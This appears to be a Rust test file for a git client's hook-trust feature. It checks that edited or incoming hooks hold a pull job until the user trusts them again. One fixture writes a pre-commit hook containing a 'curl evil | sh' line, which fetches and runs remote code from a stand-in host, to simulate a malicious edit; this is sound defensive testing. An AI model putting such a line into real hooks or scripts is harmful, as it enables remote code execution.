//! The runner's trust re-check, end to end through update: a hook edited while the trust
//! prompt is open holds the released job again, and a pull that brings other hooks into a
//! tracked hooks folder waits for the user to trust them.

use super::branch_tests::{remote_commit, with_origin};
use super::tests::{clean_tree, git};
use super::trust_held_tests::held_repo;
use super::trust_tests::{asking, drive, open, real, run};
use crate::effect::{Effect, Seal, Sealed, TrustCheck};
use crate::msg::{Msg, TrustMsg};
use crate::state::trust::TrustPrompt;
use crate::state::{AppState, Modal};
use std::path::Path;

fn prompt(st: &AppState) -> &TrustPrompt {
    let Some(Modal::Trust(p)) = &st.modal else { panic!("expected the trust prompt") };
    p
}

fn trust_and_run(st: &mut AppState) -> Vec<Effect> {
    let real = real(st);
    sealed(st, Msg::Trust(TrustMsg::Decide { real, trusted: true }))
}

/// `run`, keeping each effect's trust check (`Effect::Checked`).
fn sealed(st: &mut AppState, msg: Msg) -> Vec<Effect> {
    crate::update::update_sealed(st, msg, std::time::Instant::now())
}

/// The job effect of `fx`, which carries its check.
fn checked_job(fx: Vec<Effect>) -> Effect {
    let job = fx.into_iter().find(|e| matches!(e, Effect::Checked(c) if matches!(c.effect, Effect::RunGit { .. })));
    job.expect("a checked job")
}

/// Runs the checked job as the runner would, feeding it back to update when it is held again:
/// whether it ran.
fn recheck(st: &mut AppState, job: Effect) -> bool {
    let Effect::Checked(c) = job else { panic!("checked") };
    let crate::effect::Checked { effect, check } = *c;
    match crate::runner::execute_checked(check, effect).expect("a message") {
        msg @ Msg::Trust(TrustMsg::Stale(_)) => {
            drive(st, msg);
            false
        }
        _ => true,
    }
}

fn pull() -> Msg {
    Msg::git("Pull", &["pull", "--ff"])
}

#[test]
fn a_hook_edited_while_the_prompt_is_open_holds_the_job_again() {
    let (mut st, dir) = held_repo("recheck-edited");
    assert!(run(&mut st, pull()).is_empty());
    assert!(asking(&st));
    // Edited after the prompt was drawn: Trust and run trusts what the prompt showed.
    std::fs::write(dir.join(".git/hooks/pre-commit"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
    let job = checked_job(trust_and_run(&mut st));
    assert_eq!(job.trust_check().map(|c| c.sealed.clone()), Some(Sealed::Job { label: "Pull".into() }));
    assert!(!recheck(&mut st, job), "the edited hook isn't covered");
    assert!(st.job.is_none(), "it didn't run");
    assert_eq!(st.trust.held.as_ref().map(|h| h.job.label.as_str()), Some("Pull"), "it waits again");
    let p = prompt(&st);
    assert_eq!(p.gained.as_ref().map(|g| g.hooks.clone()), Some(vec!["pre-commit".to_owned()]), "naming the edit");
    assert!(st.held(), "the tab follows what is on disk");
    // Trusting the edited hook lets it run.
    let job = checked_job(trust_and_run(&mut st));
    assert!(recheck(&mut st, job));
    let _ = std::fs::remove_dir_all(&dir);
}

/// A repository whose `core.hooksPath` is its tracked `.githooks`, opened and trusted.
fn trusted_tracked_hooks(name: &str) -> (AppState, std::path::PathBuf, std::path::PathBuf) {
    let (mut st, work, bare) = with_origin(name);
    clean_tree(&work);
    std::fs::create_dir_all(work.join(".githooks")).unwrap();
    std::fs::write(work.join(".githooks/post-merge"), "#!/bin/sh\nexit 0\n").unwrap();
    git(&work, &["add", "."]);
    git(&work, &["commit", "-q", "-m", "hooks"]);
    git(&work, &["push", "-q", "origin", "main"]);
    git(&work, &["config", "core.hooksPath", ".githooks"]);
    open(&mut st, &work);
    assert!(asking(&st));
    assert!(!prompt(&st).scan.follows.is_empty(), "the prompt says these hooks change with the branch");
    let _ = trust_and_run(&mut st);
    assert!(!st.held());
    (st, work, bare)
}

fn cleanup(dirs: &[&Path]) {
    for d in dirs {
        let _ = std::fs::remove_dir_all(d);
    }
}

#[test]
fn a_pull_that_changes_a_tracked_hooks_folder_waits_for_trust() {
    let (mut st, work, bare) = trusted_tracked_hooks("recheck-pull");
    // A change elsewhere: the pull runs.
    remote_commit(&bare, "main", "b.txt");
    let job = checked_job(sealed(&mut st, pull()));
    assert!(recheck(&mut st, job), "same hooks");
    st.job = None;
    // The post-merge hook changed upstream: git would run the new one inside the pull.
    remote_commit(&bare, "main", ".githooks/post-merge");
    let head = git2::Repository::open(&work).unwrap().head().unwrap().target();
    let job = checked_job(sealed(&mut st, pull()));
    assert!(!recheck(&mut st, job));
    assert_eq!(git2::Repository::open(&work).unwrap().head().unwrap().target(), head, "only the fetch ran");
    assert!(st.job.is_none(), "it didn't run");
    let p = prompt(&st);
    assert_eq!(p.held.as_deref(), Some("Pull"));
    assert_eq!(p.incoming.as_ref().map(|i| i.hooks.clone()), Some(vec!["post-merge".to_owned()]), "the incoming hook");
    assert!(!st.held(), "the repository itself is still as trusted");
    // Trusting the incoming version lets the pull run.
    let job = checked_job(trust_and_run(&mut st));
    assert!(recheck(&mut st, job));
    cleanup(&[&work, &bare]);
}

#[test]
fn a_seal_goes_with_the_effect_it_was_made_for() {
    let mut st = super::tests::state();
    let dir = std::path::PathBuf::from("w");
    let check = |label: &str| TrustCheck {
        workdir: dir.clone(),
        real: dir.clone(),
        saved: None,
        sealed: Sealed::Job { label: label.into() },
        accept_unchecked: false,
    };
    let save = || Effect::SaveRecent(Vec::new());
    let shell = || Effect::Os(crate::effect::OsEffect::OpenTerminal(dir.clone()));
    // At its place; a seal whose place another effect took checks every effect of its name,
    // so none runs unchecked; one whose effect is gone is dropped.
    st.trust.seals.push(Seal { at: 1, name: shell().name(), check: check("a") });
    st.trust.seals.push(Seal { at: 1, name: shell().name(), check: check("b") });
    st.trust.seals.push(Seal { at: 0, name: "missing", check: check("c") });
    let mut fx = vec![shell(), shell(), save()];
    crate::update::trust_seal_wrap(&mut st, &mut fx, 0);
    let labels: Vec<Option<String>> = fx
        .iter()
        .map(|e| e.trust_check().map(|c| if let Sealed::Job { label } = &c.sealed { label.clone() } else { String::new() }))
        .collect();
    assert_eq!(labels, [Some("b".to_owned()), Some("a".to_owned()), None]);
    assert!(st.trust.seals.is_empty(), "each update's seals are used once");
}

#[test]
fn a_read_that_lets_git_run_carries_a_check() {
    let mut st = super::tests::state();
    let workdir = std::path::PathBuf::from("w");
    let status =
        |git_status| Effect::LoadStatus { workdir: workdir.clone(), generation: 1, submodules: false, open: None, git_status, paths: None };
    let mut fx = vec![
        status(true),
        status(false),
        Effect::VerifySignature {
            workdir: workdir.clone(),
            oid: git2::Oid::zero(),
            format: glowfly_core::signing::SigningFormat::OpenPgp,
            generation: 1,
        },
    ];
    crate::update::trust_seal_wrap(&mut st, &mut fx, 0);
    let sealed: Vec<Option<Sealed>> = fx.iter().map(|e| e.trust_check().map(|c| c.sealed.clone())).collect();
    assert_eq!(sealed, [Some(Sealed::Read), None, Some(Sealed::Read)], "a status read by libgit2 runs nothing");
}

#[test]
fn trust_and_run_on_a_prompt_that_couldnt_compare_runs_without_comparing() {
    use glowfly_core::trust::incoming::Unchecked;
    let (mut st, work, bare) = trusted_tracked_hooks("recheck-unchecked");
    let Effect::Checked(c) = checked_job(sealed(&mut st, pull())) else { unreachable!() };
    assert!(!c.check.accept_unchecked);
    let now = st.snap.as_ref().unwrap().trust_scan.clone();
    let unchecked = Some(Unchecked::TooMany(900));
    let stale = crate::msg::Stale { check: c.check, effect: c.effect, now, incoming: None, unchecked: unchecked.clone() };
    drive(&mut st, Msg::Trust(TrustMsg::Stale(Box::new(stale))));
    assert_eq!(prompt(&st).unchecked.as_deref(), unchecked.as_ref(), "the prompt says why");
    let job = checked_job(trust_and_run(&mut st));
    assert!(job.trust_check().is_some_and(|c| c.accept_unchecked), "Trust and run takes what couldn't be compared");
    cleanup(&[&work, &bare]);
}
